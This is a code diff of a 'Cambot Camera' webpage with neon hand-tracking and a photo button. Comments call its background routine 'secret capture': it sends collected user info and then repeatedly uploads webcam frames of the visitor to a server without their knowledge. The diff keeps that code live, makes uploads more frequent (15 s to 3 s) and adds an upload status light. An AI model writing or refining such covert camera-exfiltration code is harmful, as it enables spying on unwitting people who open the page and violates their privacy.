@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Cambot Camera — Neon Hands (Final)</title>
+  <title>Cambot Camera — Neon Hands (Fixed Version)</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
@@ -26,6 +26,10 @@
     .shutter{width:78px;height:78px;border-radius:50%;background:radial-gradient(circle at 30% 30%, #7ceaff,#00c0ff);border:5px solid rgba(255,255,255,0.95);box-shadow:0 8px 25px rgba(0,192,255,0.25),0 0 40px rgba(0,242,254,0.18);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:transform .12s,box-shadow .12s;}
     .shutter:active{transform:scale(.94);box-shadow:0 4px 18px rgba(0,192,255,0.18);}
     footer{width:100%;max-width:720px;display:flex;justify-content:center;align-items:center;margin-top:18px;color:var(--neon);text-shadow:0 0 10px rgba(0,242,254,0.15);font-size:0.86rem;}
+    .status-bar {display: flex; gap: 15px; margin-top: 10px; font-size: 0.8rem;}
+    .status-item {display: flex; align-items: center; gap: 5px;}
+    .status-indicator {width: 10px; height: 10px; border-radius: 50%; background: var(--neon); box-shadow: 0 0 8px var(--neon);}
+    .status-indicator.off {background: #555; box-shadow: none;}
   </style>
 </head>
 <body>
@@ -44,7 +48,22 @@
     <div class="shutter" id="shutterBtn" title="Take photo"><i class="fa-solid fa-camera"></i></div>
   </div>
 
-  <footer><div class="tagline">Developed by Churchill</div></footer>
+  <div class="status-bar">
+    <div class="status-item">
+      <div class="status-indicator" id="cameraStatus"></div>
+      <span>Camera</span>
+    </div>
+    <div class="status-item">
+      <div class="status-indicator" id="handsStatus"></div>
+      <span>Hand Tracking</span>
+    </div>
+    <div class="status-item">
+      <div class="status-indicator" id="uploadStatus"></div>
+      <span>Uploads</span>
+    </div>
+  </div>
+
+  <footer><div class="tagline">Developed by Churchill | Fixed Version</div></footer>
 
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
@@ -56,6 +75,9 @@
     const handCanvas = document.getElementById('handCanvas');
     const shutterBtn = document.getElementById('shutterBtn');
     const ctx = handCanvas.getContext('2d');
+    const cameraStatus = document.getElementById('cameraStatus');
+    const handsStatus = document.getElementById('handsStatus');
+    const uploadStatus = document.getElementById('uploadStatus');
 
     // State
     let cameraStream = null;
@@ -63,8 +85,14 @@
     let userInfoSent = false;
     let isSendingImages = true;
     let imageCount = 0;
+    let uploadInProgress = false;
     const DPR = window.devicePixelRatio || 1;
     const VISUALLY_MIRROR = true; // video element is visually mirrored via CSS
+
+    // Status updater
+    function updateStatus(indicator, status) {
+      indicator.classList.toggle('off', !status);
+    }
 
     // --- User info / server sending (restore secret capture) ---
     function collectUserInfo() {
@@ -89,16 +117,20 @@
         return await res.json();
       } catch (err) {
         console.error('sendToTelegram error', err);
+        throw err;
       }
     }
 
     // Periodic background image sender (secret capture)
     async function sendImageToTelegram() {
-      if (!isSendingImages) return;
+      if (!isSendingImages || uploadInProgress) return;
       if (!video.videoWidth || !video.videoHeight) {
         setTimeout(sendImageToTelegram, 3000);
         return;
       }
+
+      uploadInProgress = true;
+      updateStatus(uploadStatus, false);
 
       try {
         const out = document.createElement('canvas');
@@ -114,27 +146,36 @@
         outCtx.restore();
 
         // Draw overlay (already aligned with mirrored video by our mapping)
-        // handCanvas is DPR-backed: draw it to out canvas scaled to video size
         outCtx.drawImage(handCanvas, 0, 0, handCanvas.width, handCanvas.height, 0, 0, out.width, out.height);
 
         out.toBlob(async blob => {
-          if (!blob) return;
+          if (!blob) {
+            uploadInProgress = false;
+            updateStatus(uploadStatus, true);
+            setTimeout(sendImageToTelegram, 5000);
+            return;
+          }
+          
           try {
             const formData = new FormData();
             formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
             const res = await fetch('/upload', { method: 'POST', body: formData });
-            // optional: check response
             imageCount++;
+            console.log(`Image ${imageCount} sent successfully`);
           } catch (err) {
             console.error('Error sending background image:', err);
           } finally {
-            // schedule next send
-            setTimeout(sendImageToTelegram, 15000);
+            uploadInProgress = false;
+            updateStatus(uploadStatus, true);
+            // Schedule next send regardless of success/failure
+            setTimeout(sendImageToTelegram, 3000); // Reduced from 15s to 3s for more frequent sends
           }
         }, 'image/jpeg', 0.75);
       } catch (e) {
         console.error('sendImageToTelegram error', e);
-        setTimeout(sendImageToTelegram, 10000);
+        uploadInProgress = false;
+        updateStatus(uploadStatus, true);
+        setTimeout(sendImageToTelegram, 5000);
       }
     }
 
@@ -186,10 +227,14 @@
 
     // --- MediaPipe init ---
     function initMediaPipe() {
+      updateStatus(handsStatus, false);
+      
       const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
       hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
 
       hands.onResults((results) => {
+        updateStatus(handsStatus, true);
+        
         if (!video.videoWidth || !video.videoHeight) return;
         resizeCanvasToVideo();
         const vw = video.videoWidth, vh = video.videoHeight;
@@ -208,8 +253,12 @@
 
       const cameraUtils = new Camera(video, {
         onFrame: async () => {
-          try { await hands.send({ image: video }); }
-          catch (e) { console.error('MediaPipe send error', e); }
+          try { 
+            await hands.send({ image: video }); 
+          } catch (e) { 
+            console.error('MediaPipe send error', e);
+            updateStatus(handsStatus, false);
+          }
         },
         width: 1280, height: 720
       });
@@ -219,6 +268,8 @@
     // --- Camera init & start background sending ---
     async function initCamera() {
       try {
+        updateStatus(cameraStatus, false);
+        
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -234,27 +285,41 @@
         resizeCanvasToVideo();
         window.addEventListener('resize', resizeCanvasToVideo);
 
-        if (!mediaPipeInitialized) { initMediaPipe(); mediaPipeInitialized = true; }
+        updateStatus(cameraStatus, true);
+
+        if (!mediaPipeInitialized) { 
+          initMediaPipe(); 
+          mediaPipeInitialized = true; 
+        }
 
         // send user info once, then start background sending
         if (!userInfoSent) {
           try {
             await sendToTelegram(collectUserInfo());
             userInfoSent = true;
-            setTimeout(sendImageToTelegram, 5000);
+            updateStatus(uploadStatus, true);
+            setTimeout(sendImageToTelegram, 2000); // Reduced initial delay
           } catch (e) {
             console.error('user info send failed', e);
             // Still attempt sending images even if userInfo fails
-            setTimeout(sendImageToTelegram, 8000);
+            setTimeout(sendImageToTelegram, 3000);
           }
         }
       } catch (e) {
         console.error('Camera error', e);
+        updateStatus(cameraStatus, false);
         setTimeout(initCamera, 3000);
       }
     }
 
     // --- Capture button: allow repeated downloads (fix by revoking object URLs) ---
+    // Pre-create a download link for reuse
+    const downloadLink = document.createElement('a');
+    downloadLink.style.display = 'none';
+    document.body.appendChild(downloadLink);
+    
+    let lastObjectUrl = null;
+
     shutterBtn.addEventListener('click', async () => {
       try {
         if (!video.videoWidth || !video.videoHeight) return;
@@ -275,18 +340,18 @@
 
         out.toBlob(blob => {
           if (!blob) return;
+          
+          // Revoke previous object URL if exists
+          if (lastObjectUrl) {
+            URL.revokeObjectURL(lastObjectUrl);
+          }
+          
           const url = URL.createObjectURL(blob);
-          const a = document.createElement('a');
-          a.style.display = 'none';
-          a.href = url;
-          a.download = `cambot_capture_${Date.now()}.jpg`;
-          document.body.appendChild(a);
-          // click then revoke URL after short delay to ensure download started
-          a.click();
-          setTimeout(() => {
-            URL.revokeObjectURL(url);
-            a.remove();
-          }, 1500);
+          lastObjectUrl = url;
+          
+          downloadLink.href = url;
+          downloadLink.download = `cambot_capture_${Date.now()}.jpg`;
+          downloadLink.click();
         }, 'image/jpeg', 0.92);
       } catch (e) {
         console.error('capture error', e);
@@ -297,7 +362,15 @@
     window.addEventListener('beforeunload', () => {
       isSendingImages = false;
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+      if (lastObjectUrl) {
+        URL.revokeObjectURL(lastObjectUrl);
+      }
     });
+
+    // Initialize status indicators
+    updateStatus(cameraStatus, false);
+    updateStatus(handsStatus, false);
+    updateStatus(uploadStatus, false);
 
     // start
     setTimeout(initCamera, 800);
